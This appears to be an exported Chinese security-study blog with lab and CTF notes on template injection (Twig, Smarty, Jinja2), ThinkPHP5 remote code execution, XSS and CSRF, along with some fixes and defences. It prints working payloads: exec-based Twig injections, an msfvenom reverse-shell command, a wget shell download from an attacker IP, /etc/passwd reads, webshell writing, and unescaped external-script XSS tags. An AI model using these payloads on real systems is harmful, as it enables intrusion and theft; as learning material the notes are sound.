<h3 id="13-动态注入函数攻击"><a href="#13-动态注入函数攻击" class="headerlink" title="13.动态注入函数攻击"></a>13.动态注入函数攻击</h3><h3 id="14-URL攻击"><a href="#14-URL攻击" class="headerlink" title="14.URL攻击"></a>14.URL攻击</h3><h3 id="15-表单提交欺骗攻击"><a href="#15-表单提交欺骗攻击" class="headerlink" title="15.表单提交欺骗攻击"></a>15.表单提交欺骗攻击</h3><h3 id="16-HTTP请求欺骗攻击"><a href="#16-HTTP请求欺骗攻击" class="headerlink" title="16.HTTP请求欺骗攻击"></a>16.HTTP请求欺骗攻击</h3><h3 id="17-模板注入"><a href="#17-模板注入" class="headerlink" title="17.模板注入"></a>17.模板注入</h3><p>(从这里找到了大佬博客：<a href="https://www.cnblogs.com/bmjoker/">https://www.cnblogs.com/bmjoker/</a>)</p>
<p><a href="https://www.cnblogs.com/bmjoker/p/13508538.html">https://www.cnblogs.com/bmjoker/p/13508538.html</a></p>
<p>模板引擎：这里特指用于Web开发的模板引擎</p>
<p>​        它可以生成特定格式的文档，利用模板引擎来生成前端的html代码，模板引擎会提供一套生成html代码的程序，然后只需要获取用户的数据，然后放到渲染函数里，然后生成模板+用户数据的前端html页面，然后反馈给浏览器，呈现在用户面前</p>
<p>ssti模板注入</p>
<p>​                            —–也称服务器端模板注入</p>
<p>当前流行框架，比如python的flask</p>
<p>php的tp，java的spring</p>
<h4 id="漏洞成因："><a href="#漏洞成因：" class="headerlink" title="漏洞成因："></a>漏洞成因：</h4><p>​        服务端接收了用户的恶意输入以后，未经任何处理就将其作为 Web 应用模板内容的一部分，模板引擎在进行目标编译渲染的过程中，执行了用户插入的可以破坏模板的语句，因而可能导致了敏感信息泄露、代码执行、GetShell 等问题。其影响范围主要取决于模版引擎的复杂性。</p>
<p>利用图表</p>
<p><img src="/2021/08/25/src/leak/1344396-20200911174631687-758048107.png" alt="img"></p>
<h4 id="Twig模板"><a href="#Twig模板" class="headerlink" title="Twig模板"></a>Twig模板</h4><p>由图可以看出，在经过模板解析后的内容</p>
<p><img src="/2021/08/25/src/leak/1344396-20200818195801226-981945295.png" alt="img"></p>
<p>payload（2.0）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;id&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2021/08/25/src/leak/1344396-20200818231853350-914354726.png" alt="img"></p>
<p>文章还详细介绍了使用msf通过Twig模板注入获取shell</p>
<p>使用msf生成了一个php meterpreter有效载荷</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">msfvenom -p php/meterpreter/reverse_tcp -f raw LHOST=<span class="number">192.168</span><span class="number">.127</span><span class="number">.131</span> LPORT=<span class="number">4321</span> &gt; /<span class="keyword">var</span>/www/html/shell.txt</span><br></pre></td></tr></table></figure>

<p> <img src="/2021/08/25/src/leak/1344396-20200818232520602-1757346385.png" alt="img"></p>
<p> 模板注入远程下载shell，并重命名运行</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(<span class="string">&quot;exec&quot;</span>)&#125;&#125;&#123;&#123;_self.env.getFilter(<span class="string">&quot;wget http://192.168.127.131/shell.txt </span></span><br></pre></td></tr></table></figure>

<p><img src="/2021/08/25/src/leak/1344396-20200818232914668-1182705687.png" alt="img"></p>
<h4 id="Smarty模板"><a href="#Smarty模板" class="headerlink" title="Smarty模板"></a>Smarty模板</h4><p>payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;self::getStreamVariable(&quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;)&#125;</span><br></pre></td></tr></table></figure>

<p>CTF地址：<a href="https://buuoj.cn/challenges%EF%BC%88CISCN2019%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BAWeb11%EF%BC%89">https://buuoj.cn/challenges（CISCN2019华东南赛区Web11）</a></p>
<p>xff头做文章，进行注入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">X-Forwarded-For：&#123;sysytem(&#39;cat &#x2F;flag&#39;)&#125;</span><br></pre></td></tr></table></figure>

<p>这题我没有单独写文章，因为解题过程很快，知识点对应上了。</p>
<p>smarty-ssti常规利用方式</p>
<p><strong>1. {$smarty.version}</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;$smarty.version&#125;  #获取smarty的版本号</span><br></pre></td></tr></table></figure>

<p><img src="/2021/08/25/src/leak/1344396-20200820233050238-1942906786.png" alt="img"></p>
<p><strong>2. {php}{/php}</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;php&#125;phpinfo();&#123;&#x2F;php&#125;  #执行相应的php代码</span><br></pre></td></tr></table></figure>

<p><img src="/2021/08/25/src/leak/1344396-20200820233259128-196602210.png" alt="img"></p>
<p><strong>3. {literal}</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script language&#x3D;&quot;php&quot;&gt;phpinfo();&lt;&#x2F;script&gt;   </span><br></pre></td></tr></table></figure>

<p><img src="/2021/08/25/src/leak/1344396-20200820233719367-1535357026.png" alt="img"></p>
<p><strong>4.</strong> <strong>getstreamvariable</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;self::getStreamVariable(&quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;)&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2021/08/25/src/leak/1344396-20200820234305773-495371489.png" alt="img"></p>
<p><strong>5. {if}{/if}</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;if phpinfo()&#125;&#123;&#x2F;if&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2021/08/25/src/leak/1344396-20200820234610811-341143885.png" alt="img"></p>
<p>python中的ssti</p>
<p>常见模板有：jinja2， tornado</p>
<h4 id="Jinjia2"><a href="#Jinjia2" class="headerlink" title="Jinjia2"></a>Jinjia2</h4><p>以Django的模板为模型的</p>
<p>它是flask框架的一部分，Jinja2会把模板参数提供的相应的值替换了  块。</p>
<p>Jinja2使用 结构表示一个变量，它是一种特殊的占位符，告诉模版引擎这个位置的值从渲染模版时使用的数据中获取。</p>
]]></content>
      <tags>
        <tag>src</tag>
      </tags>
  </entry>
  <entry>
    <title>other 一些 information</title>
    <url>/2020/11/05/x/%E8%AF%BE%E7%A8%8B/</url>
    <content><![CDATA[<h4 id="fafu学长讲课记录的："><a href="#fafu学长讲课记录的：" class="headerlink" title="fafu学长讲课记录的："></a>fafu学长讲课记录的：</h4><p>Web安全</p>
<p>crypto：矩阵，数论，密码学</p>
<p>dvwa平台</p>
<h5 id="html的常见标签"><a href="#html的常见标签" class="headerlink" title="html的常见标签"></a>html的常见标签</h5><ul>
<li><ul>
<li><strong><!DOCTYPE html></strong> 声明为 HTML5 文档</li>
<li><strong><html></html></strong> 元素是 HTML 页面的根元素</li>
<li><strong><head></head></strong> 元素包含了文档的元（meta）数据，如 <strong><meta charset="utf-8"></strong> 定义网页编码格式为 <strong>utf-8</strong>。</li>
<li><strong><title></title></strong> 元素描述了文档的标题</li>
<li><strong><body></body></strong> 元素包含了可见的页面内容</li>
<li><strong><h1></h1></strong> 元素定义一个大标题</li>
<li><strong><p></p></strong> 元素定义一个段落</li>
<li>HTML      标签通常是<em>成对出现</em>的，比如 <b> 和      </b></li>
<li>标签对中的第一个标签是<em>开始标签</em>，第二个标签是<em>结束标签</em></li>
</ul>
</li>
</ul>
<h5 id="HTML-网页结构"><a href="#HTML-网页结构" class="headerlink" title="HTML 网页结构"></a><strong>HTML 网页结构</strong></h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">下面是一个可视化的HTML页面结构：</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line"></span><br><span class="line">&lt;title&gt;页面标题&lt;&#x2F;title&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;h1&gt;这是一个标题&lt;&#x2F;h1&gt;</span><br><span class="line"></span><br><span class="line">&lt;p&gt;这是一个段落。&lt;&#x2F;p&gt;</span><br><span class="line"></span><br><span class="line">&lt;p&gt;这是另外一个段落。&lt;&#x2F;p&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<h4 id="大佬讲课"><a href="#大佬讲课" class="headerlink" title="大佬讲课"></a>大佬讲课</h4><p><img src="/2020/11/05/x/%E8%AF%BE%E7%A8%8B/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(170).png"></p>
<p><img src="/2020/11/05/x/%E8%AF%BE%E7%A8%8B/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(171).png"></p>
<p><img src="/2020/11/05/x/%E8%AF%BE%E7%A8%8B/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(172).png"></p>
<p><img src="/2020/11/05/x/%E8%AF%BE%E7%A8%8B/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(173).png"><img src="/2020/11/05/x/%E8%AF%BE%E7%A8%8B/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(177).png"><img src="/2020/11/05/x/%E8%AF%BE%E7%A8%8B/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(179).png"></p>
<p><img src="/2020/11/05/x/%E8%AF%BE%E7%A8%8B/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(180).png"></p>
<p><img src="/2020/11/05/x/%E8%AF%BE%E7%A8%8B/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(181).png"></p>
]]></content>
      <tags>
        <tag>分享</tag>
      </tags>
  </entry>
  <entry>
    <title>ThiThinkPHP5.x 远程函数执行与sql注入</title>
    <url>/2021/07/18/src/ThinkPHP5/</url>
    <content><![CDATA[<h4 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h4><p>实验地址：<a href="https://www.anquanlong.com/lab_detail?lab_id=4&lib=5">ThinkPHP5.x 远程函数执行与sql注入_安全龙-专注做企业网络安全服务与网络安全培训! (anquanlong.com)</a></p>
<p>知识梳理：</p>
<p><strong>PoC</strong>，全称“Proof of Concept”，中文“概念验证”，常指一段漏洞证明的代码。</p>
<p><strong>Exp</strong>，全称“Exploit”，中文“利用”，指利用系统漏洞进行攻击的动作。</p>
<p><strong>Payload</strong>，中文“有效载荷”，指成功 exploit 之后，真正在目标系统执行的代码或指令。</p>
<p><strong>Shellcode</strong>，简单翻译“shell 代码”，是 Payload 的一种，由于其建立正向/反向 shell 而得名。</p>
<p>（用蚁剑连上之后，发现这是安全龙部署在阿里云上的环境）</p>
<p><img src="/2021/07/18/src/ThinkPHP5/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(280).png"></p>
<p>​    首先尝试了远程函数漏洞的初始语句：</p>
<p><code>?s=index/\think\app/invokefunction&amp;function=system&amp;return_value=&amp;command=</code></p>
<p><code>可执行Linux命令</code></p>
<p><img src="/2021/07/18/src/ThinkPHP5/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(281).png"></p>
<p>然后我们按照提示去写入一个文件，phpinfo的功能</p>
<p>利用到了file_put_contents函数（POC分析）</p>
<p><code>?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=./test.php&amp;vars[1][]=&lt;?php%20phpinfo();?&gt;</code></p>
<p><img src="/2021/07/18/src/ThinkPHP5/image-20210718191745523.png" alt="image-20210718191745523"></p>
<p>回显出了数字18，表示我们写入文件成功</p>
<p>接着进行访问</p>
<p>test.php</p>
<p><img src="/2021/07/18/src/ThinkPHP5/image-20210718191940910.png" alt="image-20210718191940910"></p>
<p>出现如上页面，成功利用漏洞。</p>
<p>接着我还尝试了一句话木马的写入，答案显然，也是可以写入并利用的。</p>
<p>最后蚁剑连接即可。</p>
<p><img src="/2021/07/18/src/ThinkPHP5/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(284).png"></p>
<p><img src="/2021/07/18/src/ThinkPHP5/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(285).png"></p>
<p><img src="/2021/07/18/src/ThinkPHP5/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(286).png"></p>
<p><img src="/2021/07/18/src/ThinkPHP5/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(287).png"></p>
<p>利用完漏洞，对于我们来说最重要的学会去修复</p>
<p>接下来学习修复这个漏洞</p>
<p>1.添加一段代码到App.php的554行</p>
<p><code>if (!preg_match(&#39;/^[A-Za-z](\w)*$/&#39;, $controller)) &#123;</code></p>
<p><code>            throw new HttpException(404, &#39;controller not exists:&#39; . $controller);</code></p>
<p><code>        &#125;</code></p>
<p><img src="/2021/07/18/src/ThinkPHP5/image-20210718193014082.png" alt="image-20210718193014082"></p>
<p>修改之后，使用原来的poc发现失效了</p>
<p>漏洞修复成功。</p>
<p><img src="/2021/07/18/src/ThinkPHP5/image-20210718193101116.png" alt="image-20210718193101116"></p>
<h4 id="附录："><a href="#附录：" class="headerlink" title="附录："></a>附录：</h4><p>最近了解到有msf，kali已经安装了，win10下也装好了，</p>
<p>就差成功攻击一下windowsever2018 r2</p>
<p>再尝试尝试</p>
<p>8.24报告：再次使用msf框架，试图利用<strong>永恒之蓝</strong>漏洞，但始终卡在了建立session上</p>
<p>不知道是不是之前在靶机上装了360导致打了补丁。。。。</p>
<p><img src="/2021/07/18/src/ThinkPHP5/image-20210825085712815.png"></p>
<p><img src="/2021/07/18/src/ThinkPHP5/QQ%E5%9B%BE%E7%89%8720210825085949.png"></p>
]]></content>
      <tags>
        <tag>src</tag>
      </tags>
  </entry>
  <entry>
    <title>知识点</title>
    <url>/2021/02/01/web/mixed/</url>
    <content><![CDATA[<h5 id="Referer"><a href="#Referer" class="headerlink" title="Referer"></a>Referer</h5><p><a href="https://www.cnblogs.com/bonelee/p/7875163.html">https://www.cnblogs.com/bonelee/p/7875163.html</a></p>
<h4 id="xss："><a href="#xss：" class="headerlink" title="xss："></a>xss：</h4><p>转载自<a href="https://blog.csdn.net/qq_33929420/article/details/112003122">https://blog.csdn.net/qq_33929420/article/details/112003122</a></p>
<p>以下内容简化，详情见链接文章</p>
<h5 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h5><p>跨站脚本Cross-site-scripting,简称：css</p>
<p>但为了避免与层叠样式表（Cascading Style Sheets，CSS）的缩写混淆</p>
<p>因此，将跨站脚本攻击缩写为XSS。</p>
<p>XSS攻击通常指的是通过利用网页开发时留下的漏洞，，用巧妙的注入方法注入恶意指令代码到网页</p>
<p>使用户加载并执行攻击者恶意制造的网页程序</p>
<p>这些恶意网页程序通常是JavaScript，但实际上也可以包括Java、 VBScript、 LiveScript、ActiveX、 Flash 或者甚至是普通的HTML。攻击成功后，攻击者可能得到包括但不限于更高的权限（如执行一些操作）、私密网页内容、会话和cookie等各种内容</p>
<h5 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h5><p>反射型（非持久型）XSS</p>
<p>存储型（持久型）XSS</p>
<p>DOM型XSS</p>
<p>通用型XSS</p>
<p>突变型XSS</p>
<p><img src="/2021/02/01/web/mixed/5f02cc1ca48e6f86487e0072ea8e1456.png" alt="img"></p>
<p><img src="/2021/02/01/web/mixed/17ec53688c413d46def4f1ebf979a819.png" alt="img"></p>
<h5 id="XSS攻击代码出现的场景"><a href="#XSS攻击代码出现的场景" class="headerlink" title="XSS攻击代码出现的场景"></a>XSS攻击代码出现的场景</h5><p>普通的XSS JavaScript注入，示例如下：</p>
<SCRIPT src="http://3w.org/XSS/xss.js"></SCRIPT>

<p>IMG标签XSS使用JavaScript命令，示例如下：</p>
<SCRIPT src="http://3w.org/XSS/xss.js"></SCRIPT>

<p>IMG标签无分号无引号，示例如下：</p>
<IMG src="javascript:alert(‘XSS’)">

<p>IMG标签大小写不敏感，示例如下：</p>
<IMG src="JaVaScRiPt:alert(‘XSS’)">

<p>HTML编码(必须有分号)，示例如下：</p>
<IMG src="javascript:alert(“XSS”)">
.........

<h5 id="XSS-攻击的预防"><a href="#XSS-攻击的预防" class="headerlink" title="XSS 攻击的预防"></a>XSS 攻击的预防</h5><h6 id="1-输入过滤"><a href="#1-输入过滤" class="headerlink" title="1.输入过滤"></a>1.输入过滤</h6><h6 id="2-前端渲染把代码和数据分隔开"><a href="#2-前端渲染把代码和数据分隔开" class="headerlink" title="2.前端渲染把代码和数据分隔开"></a>2.前端渲染把代码和数据分隔开</h6><h6 id="3-拼接HTML时对其进行转义"><a href="#3-拼接HTML时对其进行转义" class="headerlink" title="3.拼接HTML时对其进行转义"></a>3.拼接HTML时对其进行转义</h6><h4 id="什么是序列化，为什么要序列化"><a href="#什么是序列化，为什么要序列化" class="headerlink" title="什么是序列化，为什么要序列化"></a>什么是序列化，为什么要序列化</h4><p><a href="https://blog.csdn.net/u011215133/article/details/51177843?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.control&amp;dist_request_id=&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.control">https://blog.csdn.net/u011215133/article/details/51177843?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.control&amp;dist_request_id=&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.control</a></p>
<h4 id="弱口令"><a href="#弱口令" class="headerlink" title="弱口令"></a>弱口令</h4><p>一些简单的组合密码</p>
<p><a href="https://blog.csdn.net/qq_37931597/article/details/87267829?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161700465316780255266108%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=161700465316780255266108&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-87267829.first_rank_v2_pc_rank_v29&amp;utm_term=%E5%BC%B1%E5%8F%A3%E4%BB%A4&amp;spm=1018.2226.3001.4187">https://blog.csdn.net/qq_37931597/article/details/87267829?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161700465316780255266108%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=161700465316780255266108&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-87267829.first_rank_v2_pc_rank_v29&amp;utm_term=%E5%BC%B1%E5%8F%A3%E4%BB%A4&amp;spm=1018.2226.3001.4187</a></p>
<h4 id="IP欺骗（XFF头等）"><a href="#IP欺骗（XFF头等）" class="headerlink" title="IP欺骗（XFF头等）"></a>IP欺骗（XFF头等）</h4><p><a href="https://blog.csdn.net/zz_Caleb/article/details/84147066">https://blog.csdn.net/zz_Caleb/article/details/84147066</a></p>
<p>X-Forwarded-For:</p>
<h4 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h4><h4 id="TCP-IP"><a href="#TCP-IP" class="headerlink" title="TCP/IP"></a>TCP/IP</h4><p><img src="/2021/02/01/web/mixed/1.jpg"></p>
<p><img src="/2021/02/01/web/mixed/2.jpg"></p>
<h4 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h4><p>转载链接：<a href="https://www.jianshu.com/p/7f33f9c7997b">https://www.jianshu.com/p/7f33f9c7997b</a>    作者：天青色等烟雨</p>
<p>个人进行了一些修改。</p>
<h5 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h5><p>全名为Cross Site Request Forgery—-跨站请求伪造</p>
<p>一种网络攻击方式</p>
<p>通常还可缩写为CSRF或者XSRF</p>
<p>通过<strong>伪装来自受信任的用户</strong>的请求来利用受信任的网站。</p>
<p>简单理解它可以做的事：</p>
<p>在盗用你的身份后，以你的名义发送恶意请求</p>
<p>1.发送邮件</p>
<p>2.发消息</p>
<p>3.盗取账号</p>
<p>4.购买商品</p>
<p>………</p>
<h5 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h5><p><img src="/2021/02/01/web/mixed/webp" alt="img"></p>
<p>​        从上图可以看出，要完成一次CSRF攻击，受害者必须依次完成两个步骤：</p>
<ul>
<li><p>登录受信任网站A，并在本地生成Cookie。</p>
</li>
<li><p>在不登出A的情况下，访问危险网站B。</p>
<p>​        看到这里，你也许会说：“如果我不满足以上两个条件中的一个，我就不会受到CSRF的攻击”。</p>
<p>​        是的，确实如此，但你不能保证以下情况不会发生：</p>
<p>1.你不能保证你登录了一个网站后，不再打开一个tab页面并访问另外的网站。</p>
<p>2.你不能保证你关闭浏览器了后，你本地的Cookie立刻过期，你上次的会话已经结束。</p>
<p>(事实上，关闭浏览器不能结束一个会话，但大多数人都会错误的认为关闭浏览器就等于退出登录/结束会话了……)</p>
<p>3.上图中所谓的攻击网站，可能是一个存在其他漏洞的可信任的经常被人访问的网站.</p>
<p><a href="https://link.jianshu.com/?t=http://www.80sec.com/csrf-securit.html(%E8%AF%A6%E7%BB%86%E7%9A%84%E5%8E%9F%E7%90%86%E4%BB%8B%E7%BB%8D)">https://link.jianshu.com/?t=http://www.80sec.com/csrf-securit.html(详细的原理介绍)</a></p>
<h5 id="几种常见的攻击类型"><a href="#几种常见的攻击类型" class="headerlink" title="几种常见的攻击类型"></a><strong>几种常见的攻击类型</strong></h5><h6 id="GET类型的CSRF"><a href="#GET类型的CSRF" class="headerlink" title="GET类型的CSRF"></a>GET类型的CSRF</h6><p>这种类型的CSRF一般是由于程序员安全意识不强造成的。</p>
<p>GET类型的CSRF利用非常简单，只需要一个HTTP请求，所以，一般会这样利用：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">http://wooyun.org/csrf?xx</span>=<span class="string">11</span> /&gt;</span> </span><br></pre></td></tr></table></figure>

<p>在访问含有这个img的页面后，成功向<code>http://wooyun.org/csrf?xx=11</code> 发出了一次HTTP请求。所以，如果将该网址替换为存在GET型CSRF的地址，就能完成攻击了。</p>
<p><a href="https://link.jianshu.com/?t=http://wooyun.org/bugs/wooyun-2010-023783">乌云案例</a></p>
<h6 id="POST类型的CSRF"><a href="#POST类型的CSRF" class="headerlink" title="POST类型的CSRF"></a>POST类型的CSRF</h6><p>这种类型的CSRF危害没有GET型的大，利用起来通常使用的是一个自动提交的表单，如：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">http://wooyun.org/csrf.php</span> <span class="attr">method</span>=<span class="string">POST</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;xx&quot;</span> <span class="attr">value</span>=<span class="string">&quot;11&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"> <span class="built_in">document</span>.forms[<span class="number">0</span>].submit(); </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> </span><br></pre></td></tr></table></figure>

<p>访问该页面后，表单会自动提交，相当于模拟用户完成了一次POST操作。</p>
<p><a href="https://link.jianshu.com/?t=http://wooyun.org/bugs/wooyun-2010-026622">乌云案例</a></p>
<h6 id="其他猥琐流CSRF"><a href="#其他猥琐流CSRF" class="headerlink" title="其他猥琐流CSRF"></a>其他猥琐流CSRF</h6><p>过基础认证的CSRF(常用于路由器):</p>
<p>POC:</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">http://admin:admin@192.168.1.1</span> /&gt;</span> </span><br></pre></td></tr></table></figure>

<p>加载该图片后，路由器会给用户一个合法的SESSION，就可以进行下一步操作了。<br> <a href="https://link.jianshu.com/?t=http://www.wooyun.org/bugs/wooyun-2013-026825">乌云案例</a></p>
<h5 id="防御CSRF的策略"><a href="#防御CSRF的策略" class="headerlink" title="防御CSRF的策略"></a>防御CSRF的策略</h5><p>在业界目前防御 CSRF 攻击主要有三种策略：</p>
<p>验证 HTTP Referer 字段；</p>
<p>在请求地址中添加 token 并验证；</p>
<p>在 HTTP 头中自定义属性并验证</p>
<p>以下直接摘抄：</p>
<h6 id="验证-HTTP-Referer-字段"><a href="#验证-HTTP-Referer-字段" class="headerlink" title="验证 HTTP Referer 字段"></a>验证 HTTP Referer 字段</h6><p>根据 HTTP 协议，在 HTTP 头中有一个字段叫 Referer，它记录了该 HTTP 请求的来源地址。在通常情况下，访问一个安全受限页面的请求来自于同一个网站，比如需要访问 <code>http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=Mallory</code>，用户必须先登陆 bank.example，然后通过点击页面上的按钮来触发转账事件。因此，要防御 CSRF 攻击，网站只需要对于每一个转账请求验证其 Referer 值，如果是以 bank.example 开头的域名，则说明该请求是来自银行网站自己的请求，是合法的。如果 Referer 是其他网站的话，则有可能是黑客的 CSRF 攻击，拒绝该请求。<br> 这种方法的显而易见的好处就是简单易行，网站的普通开发人员不需要操心 CSRF 的漏洞，只需要在最后给所有安全敏感的请求统一增加一个拦截器来检查 Referer 的值就可以。<br> 然而，这种方法并非万无一失。Referer 的值是由浏览器提供的，虽然 HTTP 协议上有明确的要求，但是每个浏览器对于 Referer 的具体实现可能有差别，并不能保证浏览器自身没有安全漏洞。使用验证 Referer 值的方法，就是把安全性都依赖于第三方（即浏览器）来保障，从理论上来讲，这样并不安全。事实上，对于某些浏览器，比如<code>IE6 或 FF2</code>，目前已经有一些方法可以篡改 Referer 值。如果 网站支持<code>IE6 浏览器</code>，黑客完全可以把用户浏览器的 Referer 值设为以 bank.example 域名开头的地址，这样就可以通过验证，从而进行 CSRF 攻击。<br> 即便是使用最新的浏览器，黑客无法篡改 Referer 值，这种方法仍然有问题。因为 Referer 值会记录下用户的访问来源，有些用户认为这样会侵犯到他们自己的隐私权，特别是有些组织担心 Referer 值会把组织内网中的某些信息泄露到外网中。因此，用户自己可以设置浏览器使其在发送请求时不再提供 Referer。当他们正常访问银行网站时，网站会因为请求没有 Referer 值而认为是 CSRF 攻击，拒绝合法用户的访问。</p>
<h6 id="在请求地址中添加-token-并验证"><a href="#在请求地址中添加-token-并验证" class="headerlink" title="在请求地址中添加 token 并验证"></a>在请求地址中添加 token 并验证</h6><p>CSRF 攻击之所以能够成功，是因为黑客可以完全伪造用户的请求，该请求中所有的用户验证信息都是存在于 cookie 中，因此黑客可以在不知道这些验证信息的情况下直接利用用户自己的 cookie 来通过安全验证。要抵御 CSRF，关键在于在请求中放入黑客所不能伪造的信息，并且该信息不存在于 cookie 之中。可以在 HTTP 请求中以参数的形式加入一个随机产生的 token，并在服务器端建立一个拦截器来验证这个 token，如果请求中没有 token 或者 token 内容不正确，则认为可能是 CSRF 攻击而拒绝该请求。<br> 这种方法要比检查 Referer 要安全一些，token 可以在用户登陆后产生并放于 session 之中，然后在每次请求时把 token 从 session 中拿出，与请求中的 token 进行比对，但这种方法的难点在于如何把 token 以参数的形式加入请求。对于 GET 请求，token 将附在请求地址之后，这样 URL 就变成 <a href="https://link.jianshu.com/?t=http://url?csrftoken=tokenvalue">http://url?csrftoken=tokenvalue</a>。 而对于 POST 请求来说，要在 form 的最后加上 <input type="”hidden”" name="”csrftoken”" value="”tokenvalue”/">，这样就把 token 以参数的形式加入请求了。但是，在一个网站中，可以接受请求的地方非常多，要对于每一个请求都加上 token 是很麻烦的，并且很容易漏掉，通常使用的方法就是在每次页面加载时，使用 javascript 遍历整个 dom 树，对于 dom 中所有的 a 和 form 标签后加入 token。这样可以解决大部分的请求，但是对于在页面加载之后动态生成的 html 代码，这种方法就没有作用，还需要程序员在编码时手动添加 token。<br> 该方法还有一个缺点是难以保证 token 本身的安全。特别是在一些论坛之类支持用户自己发表内容的网站，黑客可以在上面发布自己个人网站的地址。由于系统也会在这个地址后面加上 token，黑客可以在自己的网站上得到这个 token，并马上就可以发动 CSRF 攻击。为了避免这一点，系统可以在添加 token 的时候增加一个判断，如果这个链接是链到自己本站的，就在后面添加 token，如果是通向外网则不加。不过，即使这个 csrftoken 不以参数的形式附加在请求之中，黑客的网站也同样可以通过 Referer 来得到这个 token 值以发动 CSRF 攻击。这也是一些用户喜欢手动关闭浏览器 Referer 功能的原因。</p>
